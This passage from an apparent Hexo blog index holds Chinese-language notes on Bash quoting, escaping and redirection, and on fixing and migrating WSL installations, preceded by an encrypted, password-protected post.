4af318753c6d7e9eab6ac3ceea846676a8d4d18606c6bc16bbbbfb8dc0ea6385e6136ff47b713fe0c099cef80fedd14d63e14848ccb9de27c3923e3c43edad753bd867f13326c06332d548306245a0b4cf33f656cec44851b0271c282acbd7d0d724725f6e7bb7ed39e6eab20a5b8fcfaca7df9fe10a3c003175c2d4ed755ecab339d0986a7111989d9ea955b7e667a06f7e67117b93a27ad7cbf93b06878ed4be6562c75b329fadd17219b1cb8658c9179cd645f7d81beaf71d00dae806f06ec1f7a1a8c9cfaeb3de45a7247690868cf6d23a5a59ca42632b0013d96b09ddcd1bfe08eb1fa0cc1be009c87aa77754fe3daf8631ea3d0bc0829cd52cd932f0067473881c86139533865246184bdf0fb150f8b3774611132f2c9d6c6f420bac3a80a7c0f56fd511553401bdfd320eda0fbec6f1217e8a1d978c05364e57cebd2cc5c85eb08f9f4ac67fcf536a7a667240f43d1707a3b1d2e05d47cc170aaac3190bdc822c3584e6f0aed418ae858f79e0fb6671ec766f253439a9b6c88f28b1e0fea47a895cba956fe338f9d14d29159e9c92fb3dcba3b5c92d813930562d4773a1908c198b1ce9459b75bd4f49c27594d57592f5bb5caf76cbcd900ecf4c6e831c27de8b55c0f14cfbc7b3559e1d3b5565ee2f491d9c04294c7e3e6542f7a809af7afac3d91ff9c8ad327ec5d1c17f5553c054b278667b454a76acc2da46b0e1b66a2c84116689799b21eb859da7353212ae92ae033c1d7a2f75fb09cc6d3d380ca5e8e77b28d8de280700a1b3f0a2461c440cc9e7dd55efac17f55e0ffa7358ec391524b981b8d695d79296cc04cad4bf0812eaa0e294c5f4d214230c8b13464b97147fab046be9127879fee49e87ffe2b82c119a8b2169f79994c856234e3c09e2c75e04a9347ea2b3dbf406e10fe72e5c1f887a04e1e0712cba3104e8485615dbd225197748de6f3261be765f5b419793f96640f73ace011f9a3428e4c26a489463885d29510fa276bc8551f0f318f6c43668fce1f9164b85806ee3ad2c75638afff4b8e4f5ba70f7508ed35616c2ebfe389e23160e326c8bf54b5ee360660bc64fe1c1fd3217d8c7d48a8334610c8d35dcf939280e71aef29a9316552d1902a4fd043660b2da88fa90fb98a85f9d1193e8081e355497e6f4e3162230f0ea3602ebc09e4ec7d2deeae4bbf60aa77ef8ae059b4cf80c311defdfe6bbe0b2d4a18fb75a343fdd92661f932e2b3d067f42eec92f1c7efb7bcdc12eae5e3bf09351f433d62970b205e811873e3643f52bddb4cf82f86964c98723af7ab7291d67d9b64e068fcff11333490a785e75674f58a1f1263791ea1c2c9b62fd9fabd8edd9bad8b9e6a98a148ad9a24b5cb5dd7f6a7a29a864d09e5ee280fd10e97a3414547962c6ebc3b79dbfba109ea6048aa2b861a767230e92af0060e0cb1996721687e9e94358f837e36b3847b1b0087cdc418de5b6021fc9bf68e794627f301cac106c301b5e34e10d3e3da27c10b93fd076f58898c5c9c7fa9d41438305cb13feda639888940a8fc367f03d40e3c0056916c7a0f373b161679fd5b92835e59a663f9f1c17c48c6401b4880a0338de50d3ca7f568cf4d2f9e199d63e0bee64d5ce7415d1ebd34809d019ecbda6ce3788616de0152fb49ea9bfd5609a61e9b28583f1e93f64fd4227e6690562a4e4e5fbc54d86383ad451c93238875658570199773cf4a23da8d64cbd009ac040d560a199b90d15fbb03b33f3b7251fa5fd037db01dede36e134780768d0cb54bd701ac9e70c2d55c71e416c745745edfbeb04f2aa11f2b3f17258676e7cff2b74ae6a60e6922c32bc4aa7a78ba7d044ee1ba2a4eae3735d835e64adf7e2e7236550f07651340c4026e461d001ce66b1000f6ff53a3eda60924d174ce55e860a26c2f07c6b4539572bfed960eb7df630838f55962ff12a6cd7aa662057c965d2ac45766475664a6babea0aadf29beb07c8f488406f13a99425bd32ada6e215980039c516532a36289e7af1f5c5bc4fc2c07f6b76eeed8e0dd9f47f310bafd1f2c534edd1a75f5cba41e2ae1ba107ea2595c93bd1a9e49531c471e652e58b415e6b880e36dba20551d584bb9c824e03893e31e7c2de2ad1b3177482a3230d23bf5974e6504d13704fe6d898828e3f07f8abcc42796116ecbdef28d117a2abe87115f33f17cca2966ad4aae795128955a49ccc2ceb1519f85dc8c277d438d32be3f3224e6e1c8ac37182c26bc0cc3fe4cc0a28206587fc5b0ffcf385ffe05b85b827b706bf7d9b36b12412fa81a70e0555abf9b8bb9338c4309eaa0441bd4310c8290877bc1e6e93e9f949ad3f53342d93a5747f808f844847cd3502eb59cec22330df3c6f7b44892e157aa23b8571bd00aa3eb588c952fd943d39edee5f69d6ce34ca4970f85ff9c86a2c98454ed78a60e7f455aa9040fde35daa49c537f904c1ead70fb023fdf6e8fc2bf978f08f4a8c355e5f039aaa16f9bce323cc6abadd326255daec314cb42113963c439fc093a29cd3bfd83f2031d7fd1afabab484cbefc7ff43f6ee7ccf58aad941c8abc7c35c8f9cb94f8cebfd3c88f26176c2de24033e14cdff24bdfa2983d0ccffb7db898bfdd3b554a285c529b37f60bc3d20a4670cd4250cabe7a5a44d6e177e84e00088d7eea9f192a0a57de356641297c2b6e88ee114117997d0fc992a111105d36f654eca05b63f937def10c1ba59efa6369a53c64cae57e1ecc9843f027935df17b7f54a7f8d37d88c0327e880045e65b92d798b6324909a0fb780e1b8e658058bb196df0be9b6b1a8de5d82bc775bebd80cbda340f80f8b6ffd08d196110bce9c2fbe312077b57c3d4cbbe2eb338167e0982946e42cc2b3184a69df203a6a2f6f2b3a6db6f022fb1e33744d12bf5ee0b9eec419d057a471300c00a52ef40204d7e1c5bdea348116f7cf6365eb2f22abae9f2f145cf3f58003015a0bd08ad9ccc49d0b87158fc9ec4ed7f2be08662cb9dc7261caca0a2e9ae73f307ba7e662252e8ea8d35dad7311369007f7618040055ef71f73d17e24174de4583685d351a325f692356d12740c7d1ecf9ae0c9239c0d965941324f8222a3a5db464e7f755cfd90e9b942223398dc81bf243bc24836d358a9fbb75b403205c2e8b54ed5a49dd7b119cf75d1ca45a648325db21c11930d103e888c514b01d2c6e1d69d9f47a072bf48e6770f335ab43da829414dd2ad34ea20089e373b86c17dd92f40cca13708020ab3eaf758e18c64e85a5ba18ce347f8234a0c1217522a06f313bf5a2ffa66c03930888175feefc4703f62ce52aef1d4b06a62cff73dfe73b9899882428582c1a23bc131dd88f7ddff3c8da887ea94f540f064cbfa34f8dcd25fd2f4041b5a0ef9a4ba07d6a0e50f23f735ed8e1497ed065686c8afdda0dd5b91e02ae5d08a4861f51e53016626a0e97c759221f1673ecc1ab25ecc2bd1f8c1ef26f463eeeefc1fa83fc532d8729222938e28921c32a88d6f369c2bb77732d8f844d3b47f232a208ca28db18d30ba5d6aca7e8a8d20b6824f65cf73bf02ebb9a582cb332c2ddad173ed157e56e9de87ce7285e6daac5a3135b776afd93b563cf219a466ad20acf25c388fdb8ca7c3aacc9ea814941f44ddd313d6316eac0cdeee6f959cda1224f7c27f9c015359b424ed9ea3f585c1664ef40910abd86768195dc47d5b4c6d9c67d7b80bc794a9049dbee7f6825c3f6</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Solution</category>
        <category>Custom</category>
      </categories>
  </entry>
  <entry>
    <title>Shell Issues</title>
    <url>/2023/09/28/Solution/Linux/Shell%20Issues/</url>
    <content><![CDATA[<h2 id="Debris"><a href="#Debris" class="headerlink" title="Debris"></a>Debris</h2><ul>
<li><p>双引号包裹下引用变量，其中的<strong>换行符号</strong>（不是转义）会被解析，否则会被直接忽视（不会被替换为 <code>\n</code> ），例如：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pre</span>=<span class="string">&quot;</span></span><br><span class="line"><span class="string">I</span></span><br><span class="line"><span class="string">Love</span></span><br><span class="line"><span class="string">You</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$pre</span>	<span class="comment"># 输出一行内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$pre</span>&quot;</span>	<span class="comment"># 输出多行内容</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>引用变量时，若其中存储的是字符串且对字符串的转义有严格要求，则形如 <code>&quot;$var&quot;</code> 的变量引用<strong>等价于</strong>其内容外套一层双引号，该引用过程只发生一次转义。</p>
</li>
</ul>
<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><h3 id="重定向权限与-tee"><a href="#重定向权限与-tee" class="headerlink" title="重定向权限与 tee"></a>重定向权限与 <code>tee</code></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo echo $pre_source &gt; /etc/apt/sources.list</span><br></pre></td></tr></table></figure></div>

<p>该语句会提示权限不够，因为 <code>&gt;, &gt;&gt;</code> 等重定向符也需要 root 权限。</p>
<p>可以利用 <code>tee</code> 命令进行重定向：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$pre_source</span>&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list</span><br></pre></td></tr></table></figure></div>

<p><code>tee</code> 相当于 <code>&gt;</code> ，<code>tee -a</code> 相当于 <code>&gt;&gt;</code> 。</p>
<h3 id="Here-Document"><a href="#Here-Document" class="headerlink" title="Here Document"></a>Here Document</h3><p>为”here document”的分隔符加双引号，会让其不解析输入内容中的变量表达式 <code>$&lt;str&gt;</code> ：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;cmd&gt; &lt;&lt; <span class="string">&quot;EOF&quot;</span></span><br><span class="line">	<span class="variable">$abc</span></span><br><span class="line">EOF</span><br></pre></td></tr></table></figure></div>

<p>终止符仍为 <code>EOF</code> 不加引号，且必须顶格。</p>
<hr>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 设置 root 密码</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">root_passwd</span></span>()&#123;</span><br><span class="line">    passwd -d root &gt; /dev/null</span><br><span class="line">    passwd root &lt;&lt;- <span class="string">EOF &gt; /dev/null</span></span><br><span class="line"><span class="string">        &quot;$pre_passwd&quot;</span></span><br><span class="line"><span class="string">        &quot;$pre_passwd&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">    <span class="comment"># EOF 好像必须挤在开头, 且后面不能跟别的东西, 包括注释</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>&lt;&lt;-</code> 能让传入的数据忽略制表符 <code>\t</code> 。</p>
<p><strong>但是</strong>在编辑器 VSC 中的 tab 按键产生的缩进实际上是多个空格，而 Vim 下的 tab 产生的缩进用的才是制表符 <code>\t</code> 。</p>
<p>由于 <code>&lt;&lt;-</code> 只会忽略制表符 <code>\t</code> 而不是空格，因此此处输入的密码前面有数个空格。</p>
<p><strong>同时</strong> hd 下的双引号并不会被解析，因此密码前后各有一个双引号。</p>
<h3 id="shell-与-echo-的转义"><a href="#shell-与-echo-的转义" class="headerlink" title="shell 与 echo 的转义"></a><code>shell</code> 与 <code>echo</code> 的转义</h3><p>shell 真是转义地狱：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">pre=<span class="string">&quot;</span></span><br><span class="line"><span class="string">        echo \&quot;</span></span><br><span class="line"><span class="string">#   for i in &#123;0..255&#125;; do print -Pn \\\&quot;%\\\$&#123;i&#125;F\\\$&#123;(l:3::0:)i&#125;%f \\\&quot; \\\$&#123;\\\$&#123;(M)\\\$((i%8)):#7&#125;:+\\\$&#x27;\\\\n&#x27;&#125;; done</span></span><br><span class="line"><span class="string">        \&quot;</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>执行 <code>su - festu -c $pre</code> 换行会被转义后输出。</p>
<p><strong>解释：</strong></p>
<p><code>echo</code> 会对传入的特殊字符转义一次。其转义范围包括 <code>\n, \t</code> 等特殊字符，但不包括 <code>$, `, &quot;</code> 。</p>
<p>据此来剖析一下上述语句的转义流程。</p>
<p>首先是 $pre 变量被创建，shell 解析双引号括起的字符串时，会对其中的 <code>$, `, &quot;</code> 进行一次转义。因此存入 $pre 中的换行周边的内容为 <code>\\n</code> 。</p>
<p>接着变量作为参数被给命令 <code>su</code> ，这个过程原样传递。传入的内容又作为 shell 命令被解析，由于换行符仍然是被双引号括起的字符串，因此再次发生转义，<code>\\n</code> 变为 <code>\n</code> 作为参数被传给 <code>echo</code> 命令，然后又被转义，最后变成了换行被输出。</p>
<p>前两次转义对 <code>$, `, &quot;</code> 同样生效，同时又作用于 <code>\\\\n</code> 中的反斜杠，换行符也牵连着被**转义**了两次（当然这里只是说起了转义的效果，实际上 shell 解析双引号括起的字符串时并不解析换行符本身的转义即  <code>\n</code> ）</p>
<p>而 echo 的转义只对换行符本身起效，因此换行符最终被转义了三次，区别于 shell 特殊字符的两次。</p>
<p><strong>解决方案：</strong>为 <code>echo</code> 添加 <code>-E</code> 参数取消它自带的特殊字符转义：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pre=<span class="string">&quot;</span></span><br><span class="line"><span class="string">        echo -E \&quot;</span></span><br><span class="line"><span class="string">#   for i in &#123;0..255&#125;; do print -Pn \\\&quot;%\\\$&#123;i&#125;F\\\$&#123;(l:3::0:)i&#125;%f \\\&quot; \\\$&#123;\\\$&#123;(M)\\\$((i%8)):#7&#125;:+\\\$&#x27;\\\\n&#x27;&#125;; done</span></span><br><span class="line"><span class="string">        \&quot;</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>值得一提的是 echo 与 shell 的转义非常复杂，反复混用可能会非常混乱，造成”转义地狱”的糟糕情况（虽然 shell 早就是了），而且研究起来价值不高，因此不建议反复混用或深究。</p>
<hr>
<p>（就深究一点点 &#x3D; &#x3D;）</p>
<p>例如 shell 并不解析单引号字符串中的转义，因此理论上下面的脚本也能输出 <code>\n</code> ：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pre=<span class="string">&quot;</span></span><br><span class="line"><span class="string">        echo &#x27;</span></span><br><span class="line"><span class="string">#   for i in &#123;0..255&#125;; do print -Pn \\\&quot;%\\\$&#123;i&#125;F\\\$&#123;(l:3::0:)i&#125;%f \\\&quot; \\\$&#123;\\\$&#123;(M)\\\$((i%8)):#7&#125;:+\\\$&#x27;\\\\n&#x27;&#125;; done</span></span><br><span class="line"><span class="string">        &#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>对于 <code>\\\\n</code> ，变量赋值时是双引号字符串，被转义一次，变为 <code>\\n</code> ；执行字符串表示的命令时是单引号字符串，因此不做转义；传给 <code>echo</code> 后被转义一次，变为 <code>\n</code> 。</p>
<p>理论上该语句只对换行符做了两次转义，最后输出的只是字符 <code>\n</code> 。但实际上输出时仍发生了换行。</p>
<p>除此之外还有很多奇怪的问题…总之不建议深究。</p>
<hr>
<p>最后作出一个结论，如果是全是使用双引号的需要二次转义的场景（写入配置时），使用 <code>echo -E</code></p>
<h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>写脚本时看能希望在脚本运行时，永久将『标准错误输入』重定向至某处，利用 <code>exec</code> 可实现：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 2&gt;~/errLog		<span class="comment"># 重定向至文件</span></span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/null	<span class="comment"># 重定向至空</span></span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/tty1	<span class="comment"># 将标准输出重定向到 tty1 终端</span></span><br></pre></td></tr></table></figure></div>

<p>标准输入输出设备标识符：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/0：标准输入 0</span><br><span class="line">/proc/self/fd/1：标准输出 1 </span><br><span class="line">/proc/self/fd/2：标准错误输出 2</span><br></pre></td></tr></table></figure></div>

<h4 id="与另一个用户通信"><a href="#与另一个用户通信" class="headerlink" title="与另一个用户通信"></a>与另一个用户通信</h4><p><code>write bob &gt; /dev/tty2</code> 与同一系统下的另一用户 bob 通信。</p>
<h3 id="su-指定用户执行命令"><a href="#su-指定用户执行命令" class="headerlink" title="su 指定用户执行命令"></a><code>su</code> 指定用户执行命令</h3><p>在交互式 shell 中 su 指定用户执行命令并不能准确读取用户的环境变量如 <code>~</code> ，但在脚本中运行时可以。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su - festu -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">	cd ~;</span></span><br><span class="line"><span class="string">	mkdir -p Tmp;</span></span><br><span class="line"><span class="string">	cd Tmp;</span></span><br><span class="line"><span class="string">	echo <span class="variable">$user</span> &gt;&gt; tmp.txt</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="comment"># tmp.txt 中的内容为&quot;festu&quot;，有换行可以不要分号</span></span><br><span class="line"><span class="comment"># sudo 执行 Shell 脚本时也能读取正确的用户变量</span></span><br></pre></td></tr></table></figure></div>

<p>奇怪的转义特性（感觉是 BUG）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">user=<span class="string">&quot;festu&quot;</span></span><br><span class="line">su - festu -c <span class="string">&quot;echo \$user&quot;</span> <span class="comment"># 输出空行</span></span><br><span class="line">su - festu -c <span class="string">&quot;echo <span class="variable">$user</span>&quot;</span> <span class="comment"># 输出&quot;festu&quot;</span></span><br><span class="line">su - festu -c <span class="string">&quot;echo \&quot;\$user\&quot;&quot;</span> <span class="comment"># 输出&quot;festu&quot;</span></span><br><span class="line">su - festu -c <span class="string">&quot;echo \&quot;\\\$user\&quot;&quot;</span> <span class="comment"># 输出&quot;$user&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>当试图用 <code>echo</code> 向配置文件中写入原生的 <code>$HOME</code> 等字符串时，需要注意转义的次数。</p>
<h3 id="Vim-操作与转义脚本"><a href="#Vim-操作与转义脚本" class="headerlink" title="Vim 操作与转义脚本"></a>Vim 操作与转义脚本</h3><p><strong>使用场景：</strong></p>
<p>在编写系统配置脚本时，希望用 <code>echo &#39;...&#39; &gt; conf</code> 语句去快速创建配置文件，由于单引号内的字符是绝对的原始字符串，因此无需特殊处理。但如果使用了双引号，就要考虑对原配置文件进行转义处理。</p>
<p>更进一步，脚本中可能需要指定用户执行配置命令，以利用用户的环境变量，如家目录 <code>~</code> ：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su - &lt;user&gt; -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">	echo \&quot;</span></span><br><span class="line"><span class="string">		...</span></span><br><span class="line"><span class="string">	\&quot; &gt; ~/conf</span></span><br><span class="line"><span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>此时就需要对配置文件的内容进行二次转义。</p>
<p><strong>转义脚本：</strong></p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$1</span> ];<span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;0&#125;</span> fileName [times]&quot;</span></span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$1</span> == <span class="string">&quot;-h&quot;</span> || <span class="variable">$1</span> == <span class="string">&quot;--help&quot;</span> ]];<span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Escape special characters in \&quot;Double Quotes\&quot; of shell scripts (for one time or more).&quot;</span></span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$2</span> ];<span class="keyword">then</span></span><br><span class="line">	<span class="built_in">times</span>=1</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">times</span>=<span class="variable">$2</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="variable">$&#123;times&#125;</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	vim <span class="variable">$1</span> &lt;&lt;- <span class="string">EOF</span></span><br><span class="line"><span class="string">		:%s/\\\\/\\\\\\\\/g</span></span><br><span class="line"><span class="string">		:%s/\&quot;/\\\\\&quot;/g</span></span><br><span class="line"><span class="string">		:%s/[\$]/\\\\\$/g</span></span><br><span class="line"><span class="string">		:%s/\`/\\\\\`/g</span></span><br><span class="line"><span class="string">		:wq</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></div>

<p><strong>解析：</strong></p>
<p>非常的美妙不是吗。</p>
<p>首先在终端中键入的（即保存在文本中的） <code>\\</code> 被 shell 解析时发生第一次转义。</p>
<p>对于表达式 <code>s/&lt;regex&gt;/&lt;string&gt;/g</code> ，首先他会<strong>直观地</strong>替换 vim 显示的内容（尤其是对于反斜杠）。</p>
<p>表达式中 regex 部分被视为正则表达式，string 部分被视为普通字符串，<code>\\</code> 由于其特殊性，不论在 regex 部分还是 string 部分都会且仅会被转义一次变为 <code>\</code> 。</p>
<p>由于替换的”直观性”，<strong>在 vim 中看到的</strong>的所有 <code>\</code> 会被挨个替换<br>而对于 <code>$</code> 字符，由于在正则表达式中它代表结尾，因此在 regex 中表示一个 <code>$</code> ，需要用 <code>\$</code> 。</p>
<p>由于这是转义一次后的结果，因此写在脚本中的字符串为 <code>\\$</code> ；或者用 <code>[$]</code> 即 <code>[\\$]</code> 也可以。而在 string 部分 <code>$</code> 是普通字符，因此不需要转义。</p>
<p>对于反引号 <code>`</code> ，由于在 shell 脚本中它有特殊含义，因此首先需要用 <code>\\\`</code> 来转义，使其在被 shell 解析后仍为反引号，而不是作为命令解析器被处理。</p>
<p>从这个角度来讲，<code>$</code> 也应该额外添加反引号做转义，事实上这么做确实是更好的。</p>
<p>回到反引号，在作为 vim 命令模式的参数传入时它和美元符号一样没有特殊含义，因此不再需要额外的转义。</p>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>WSL-Issues</title>
    <url>/2023/09/23/Solution/Linux/WSL-Issues/</url>
    <content><![CDATA[<h2 id="Debris"><a href="#Debris" class="headerlink" title="Debris"></a>Debris</h2><ul>
<li>Windows 与 Linux 文件互访：Windows 文件系统整个在 <code>/mnt/</code> 下，例如 C、D、E 盘分别对应 <code>/mnt/c/, /mnt/d/, /mnt/e/</code></li>
<li>关于家庭版 Windows『Windows 防火墙 &#x2F; 内核隔离』可能造成的虚拟化功能管理失效问题：<a class="link"   href="https://blog.csdn.net/qq_43780850/article/details/108961906" >参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><h3 id="zsh-exec-format-error-notepad-exe"><a href="#zsh-exec-format-error-notepad-exe" class="headerlink" title="zsh: exec format error: notepad.exe"></a>zsh: exec format error: notepad.exe</h3><p>突然某天发现自己的 WSL 运行不了 PE 文件了。查找了一下发现 Github 上有个 <a class="link"   href="https://github.com/microsoft/WSL/issues/9146" >Issue <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，情况并不完全一致，但遇到的问题逻辑是一致的。简单概括就是开启了『WSL』的『systemd』服务后，Linux 的文件处理逻辑发生了变化，导致无法正确执行 PE 文件。</p>
<hr>
<p>本地利用 <code>ls /proc/sys/fs/binfmt_misc</code> 查看支持的服务，会发现开启『systemd』服务后对于『WSL 互操作』的支持『WSLInterop』都消失了，也就是说互操作服务直接被关闭了。</p>
<p>解决方案：</p>
<ol>
<li>在”wsl.conf”中关闭”systemd”选项。</li>
</ol>
<h3 id="拯救Docker-WSL重装"><a href="#拯救Docker-WSL重装" class="headerlink" title="拯救Docker &amp; WSL重装"></a>拯救Docker &amp; WSL重装</h3><p><strong>2023&#x2F;3&#x2F;17：</strong>Docker 突然就寄了，查了一下可能是 wsl 寄了，于是打算重装WSL。先是常规注销分支”Ubuntu-20.04”，但是发现它注销了，分支文件还留在电脑上，导致不能下载新的，会提示”Ubuntu 20.04 LTS”已安装，而旧的坏掉了（Failed Distribution），因此需要手动卸载Ubuntu-20.04应用，然后重新下载并安装。</p>
<p>校园网下无法安装WSL，下载与安装会一直卡住，微软商店甚至点击安装都毫无反应，切换至手机热点后就能正常下载。但是重装了ubuntu后仍然出现报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WslRegisterDistribution failed with error: 0x800701bc</span><br></pre></td></tr></table></figure></div>

<p>原因是WSL2的内核没有更新，可以通过：<code>wsl --update</code> 直接升级，在热点下CLI的下载也有进度条。下载完毕后重新打开下载的ubuntu-20.04，正常运行。</p>
<p>微软商店下载的Ubuntu在初始化（设置新用户名及密码）前不被CLI的WSL识别，初始化完毕后自动登记至WSL中。此时进入wsl中默认用户为root，使用 <code>ubuntu2004 config --default-user festu</code> 切换用户为festu。尽管经过了导出导入等操作，此时wsl中的ubuntu-20.04仍是微软商店下载的ubuntu，两者是同一个系统。注销分发并没有删除这个ubuntu2004，只是将其取消了登记，不知道是不是因为这个ubuntu不是用WSL的CLI下载管理的。</p>
<h3 id="WSL-搬家"><a href="#WSL-搬家" class="headerlink" title="WSL 搬家"></a>WSL 搬家</h3><p><strong>2022&#x2F;9&#x2F;12：</strong>ubuntu突然跑不起来了，就删了重装了一个kali，结果发现kali的包管理似乎不太行，又不知道如何安装工具，就又重新装了一个ubuntu-20.04</p>
<p><code>wsl -h</code> 可以查看手册，<code>wsl --unregister ubuntu</code> 注销虚拟机，然后 <code>wsl -l -o</code> 查看可安装的版本，<code>wsl --install -d ubuntu-20.04</code> 安装ubuntu-20.04，然后 <code>wsl --export ubuntu-20.04 f:\ubuntu\ubuntu2004.tar</code> 将包导出，然后 <code>wsl --unregister ubuntu-20.04</code> 注销已安装的，然后重新导入：<code>wsl --import ubuntu-20.04 f:\ubuntu\ubuntu-20.04 f:\ubuntu\ubuntu2004.tar</code> 。注意前一个参数是安装位置，后一个参数是导入包的位置，弄反了会出现报错：”拒绝访问”。导入完毕后会自动以管理员身份登录，需要设置默认账户：<code>ubuntu2004.exe config --default-user festu</code> 。若exe文件是未安装的wsl系统则会直接安装目标系统再执行，因此需要先在system32文件夹下找到exe文件的名称。</p>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/zhys2007/article/details/110958577" >WSL2迁移办法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<p><a class="link"   href="https://blog.csdn.net/yihuajack/article/details/119915303" >将WSL2移动到其他磁盘 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，</p>
<p><strong>]</strong></p>
<h3 id="Errors"><a href="#Errors" class="headerlink" title="Errors"></a>Errors</h3><ul>
<li><pre><code class="sh">Error: 0x80040326
Error code: Wsl/Service/0x80040326
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  解决：`wsl --update`</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  Error: 0x80240438</span><br><span class="line">  Error code: Wsl/UpdatePackage/0x80240438</span><br></pre></td></tr></table></figure></div>

解决：**确保网络可用且通畅**，可尝试重启WindowsUpdate服务：

<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">net stop wuauserv</span><br></pre></td></tr></table></figure></div>

或cmd+r：services.msc，重启Windows Update服务。

[参考博客](https://blog.csdn.net/pcplayer/article/details/127890104)
</code></pre>
</li>
<li><p>安装WSL：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Failed to fetch the list distribution from &#x27;https://raw.githubusercontent.com/microsoft/WSL/master/distributions/DistributionInfo.json&#x27;. 无法解析服务器的名称或地址</span><br><span class="line">Error code: Wsl/WININET_E_NAME_NOT_RESOLVED</span><br></pre></td></tr></table></figure></div>

<p>更改DNS即可解决。</p>
</li>
<li><pre><code class="error">Error code: Wsl/Service/CreateInstance/CreateVm/ConfigureNetworking/0x80041002
</code></pre>
